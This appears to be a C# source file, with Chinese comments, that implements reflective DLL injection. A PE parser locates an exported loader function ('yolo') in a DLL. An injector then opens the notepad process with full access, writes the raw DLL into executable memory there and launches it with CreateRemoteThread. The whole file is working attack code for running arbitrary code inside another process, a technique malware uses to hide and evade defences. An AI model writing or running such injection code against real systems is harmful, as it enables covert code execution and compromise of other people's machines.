using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

public class PeParser
{
    // DOS 头结构
    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;       // "MZ"
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;          // 指向 NT 头的偏移
    }

    // NT 头（64位简化，实际可根据架构选择）
    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_NT_HEADERS64
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_OPTIONAL_HEADER64
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        // Data Directories（固定 16 个条目）
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;          // 节名称（如 ".text"），不足8字节以0填充
        public uint VirtualSize;     // 节在内存中的实际大小
        public uint VirtualAddress;  // 节在内存中的 RVA
        public uint SizeOfRawData;   // 节在文件中的大小（对齐后）
        public uint PointerToRawData;// 节在文件中的偏移
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;  // 节属性（如可读、可写、可执行）
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    // 导出表结构
    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_EXPORT_DIRECTORY
    {
        public uint Characteristics;
        public uint TimeDateStamp;
        public ushort MajorVersion;
        public ushort MinorVersion;
        public uint Name;
        public uint Base;
        public uint NumberOfFunctions;
        public uint NumberOfNames;
        public uint AddressOfFunctions;
        public uint AddressOfNames;
        public uint AddressOfNameOrdinals;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct RUNTIME_FUNCTION
    {
        public uint BeginAddress;
        public uint EndAddress;
        public uint UnwindData;
    }

    private byte[] dllBytes;
    private IMAGE_DOS_HEADER dosHeader;
    private IMAGE_FILE_HEADER fileHeader;
    private IMAGE_OPTIONAL_HEADER64 optHeader;
    private IntPtr sectionHeaderPtr;
    private int sectionCount;
    private IMAGE_EXPORT_DIRECTORY exportDir;
    private uint namesOffset;
    private uint ordinalsOffset;
    private uint functionsOffset;

    private uint exceptionOffset;
    private int runtimeFuncCount;

    private GCHandle handle;
    private IntPtr ptr;

    public PeParser(byte[] dllBytes)
    {
        this.dllBytes = dllBytes;
        this.handle = GCHandle.Alloc(this.dllBytes, GCHandleType.Pinned);
        ptr = handle.AddrOfPinnedObject();

        this.dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(ptr);
        if (dosHeader.e_magic != 0x5A4D) // "MZ"
            throw new Exception("Invalid DOS header");

        // NT 头位置
        IntPtr ntHeaderPtr = ptr + dosHeader.e_lfanew;
        uint signature = (uint)Marshal.ReadInt32(ntHeaderPtr);
        if (signature != 0x00004550) // "PE\0\0"
            throw new Exception("Invalid PE signature");

        // 读取可选头（64位版本）
        // 首先获取文件头，判断架构
        this.fileHeader = Marshal.PtrToStructure<IMAGE_FILE_HEADER>(ntHeaderPtr + 4);
        bool is64Bit = (fileHeader.Machine == 0x8664); // AMD64
        if (!is64Bit)
            throw new Exception("Only x64 is supported in this example");

        // 获取可选头指针
        IntPtr optHeaderPtr = ntHeaderPtr + 0x18; // 跳过 Signature(4) + FileHeader(20)
        this.optHeader = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(optHeaderPtr);


        // 获取导出表 RVA 和大小
        uint exportRva = optHeader.DataDirectory[0].VirtualAddress;
        if (exportRva == 0)
            throw new Exception("No export table found");

        // 定位导出表（需要将 RVA 转换为文件偏移）
        // 先获取节表
        this.sectionHeaderPtr = optHeaderPtr + Marshal.SizeOf<IMAGE_OPTIONAL_HEADER64>();
        this.sectionCount = fileHeader.NumberOfSections;
        uint exportOffset = Rva2Raw(exportRva);

        // 读取导出表
        IntPtr exportDirPtr = ptr + (int)exportOffset;
        this.exportDir = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(exportDirPtr);

        // 获取函数名表 RVA 并转为偏移
        uint namesRva = exportDir.AddressOfNames;
        this.namesOffset = Rva2Raw(namesRva);
        uint ordinalsRva = exportDir.AddressOfNameOrdinals;
        this.ordinalsOffset = Rva2Raw(ordinalsRva);
        uint functionsRva = exportDir.AddressOfFunctions;
        this.functionsOffset = Rva2Raw(functionsRva);


        if (optHeader.NumberOfRvaAndSizes <= 3) throw new Exception("No exception directory");
        IMAGE_DATA_DIRECTORY exceptionDir = optHeader.DataDirectory[3];
        if (exceptionDir.VirtualAddress == 0 || exceptionDir.Size == 0) throw new Exception("Exception directory empty");

        // 定位异常目录文件偏移
        this.exceptionOffset = Rva2Raw(exceptionDir.VirtualAddress);
        this.runtimeFuncCount = (int)(exceptionDir.Size / Marshal.SizeOf<RUNTIME_FUNCTION>());

    }

    ~PeParser()
    {
        handle.Free();
    }

    public uint GetFuncRva(string functionName)
    {
        uint i = 0;
        uint functionRva = 0;
        // 遍历名称表
        for (; i < exportDir.NumberOfNames; i++)
        {
            uint namePtrRva = BitConverter.ToUInt32(dllBytes, (int)(namesOffset + i * 4));
            uint nameOffset = Rva2Raw(namePtrRva);
            int start = (int)nameOffset;
            int length = 0;
            while (start + length < dllBytes.Length && dllBytes[start + length] != 0)
            {
                length++;
            }
            string name = System.Text.Encoding.ASCII.GetString(dllBytes, (int)nameOffset, length);
            if (name == functionName)
            {
                // 获取序号
                ushort ordinalIndex = BitConverter.ToUInt16(dllBytes, (int)(ordinalsOffset + i * 2));
                functionRva = BitConverter.ToUInt32(dllBytes, (int)(functionsOffset + ordinalIndex * 4));
                break;
            }
        }
        if (functionRva == 0)
            throw new Exception("Function not found in exports");


        return functionRva;
    }

    public uint GetFuncRaw(string functionName)
    {
        uint functionRva = 0;
        functionRva = GetFuncRva(functionName);
        if (functionRva == 0)
            return 0;
        return Rva2Raw(functionRva);
    }

    public uint GetFuncSize(string functionName)
    {
        uint functionRva = 0;
        functionRva = GetFuncRva(functionName);
        if (functionRva == 0)
            return 0;

        int i = 0;
        // 遍历 RUNTIME_FUNCTION 数组
        for (i = 0; i < runtimeFuncCount; i++)
        {
            IntPtr runtimeFuncPtr = ptr + (int)(exceptionOffset + i * Marshal.SizeOf<RUNTIME_FUNCTION>());
            RUNTIME_FUNCTION runtimeFunc = Marshal.PtrToStructure<RUNTIME_FUNCTION>(runtimeFuncPtr);
            if (runtimeFunc.BeginAddress == 0 && runtimeFunc.EndAddress == 0 && runtimeFunc.UnwindData == 0)
                continue;

            // 比较起始 RVA（BeginAddress 本身就是 RVA）
            if (runtimeFunc.BeginAddress == functionRva)
            {
                return runtimeFunc.EndAddress - functionRva;
            }
        }


        return 0;
    }

    // 将 RVA 转换为文件偏移（基于节表）
    public uint Rva2Raw(uint rva)
    {
        // Marshal.SizeOf<IMAGE_SECTION_HEADER>()
        const int IMAGE_SIZEOF_SECTION_HEADER = 40;
        for (int i = 0; i < this.sectionCount; i++)
        {
            IntPtr sectionPtr = this.sectionHeaderPtr + i * IMAGE_SIZEOF_SECTION_HEADER;
            IMAGE_SECTION_HEADER section_header = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionPtr);
            uint section_rva = section_header.VirtualAddress;
            uint section_raw = section_header.PointerToRawData;
            uint section_size = section_header.SizeOfRawData;

            if (rva >= section_rva && rva < section_rva + section_size)
            {
                return rva - section_rva + section_raw;
            }
        }
        throw new Exception("RVA not found in any section");
    }
}

public class ReflectiveInjector
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    public static bool Inject(string processName)
    {

        // 查找指定的进程
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0)
        {
            return false;
        }

        // 获取进程句柄
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, processes[0].Id);

        // 加载DLL到内存
        byte[] dllBytes = File.ReadAllBytes("D:\\files\\projects\\ReflectiveDLL\\x64\\Release\\ReflectiveDLL.dll");

        PeParser peParser = new(dllBytes);

        // 找到预加载函数的RAW
        uint yolo_raw = peParser.GetFuncRaw("yolo");


        // 在目标进程中申请内存空间以便存放DLL
        IntPtr remoteBase = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)(dllBytes.Length), 0x3000, 0x40); // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
        if (remoteBase == IntPtr.Zero) return false;
        IntPtr bytesWritten = IntPtr.Zero;
        bool success = WriteProcessMemory(hProcess, remoteBase, dllBytes, (uint)dllBytes.Length, out bytesWritten);
        if (!success) return false;
        IntPtr yoloAddr = IntPtr.Add(remoteBase, (int)(yolo_raw));

        uint threadId;
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, yoloAddr, IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero) return false;

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }

    static void Main(string[] args)
    {
        ReflectiveInjector.Inject("notepad");
        Console.ReadKey();
    }
}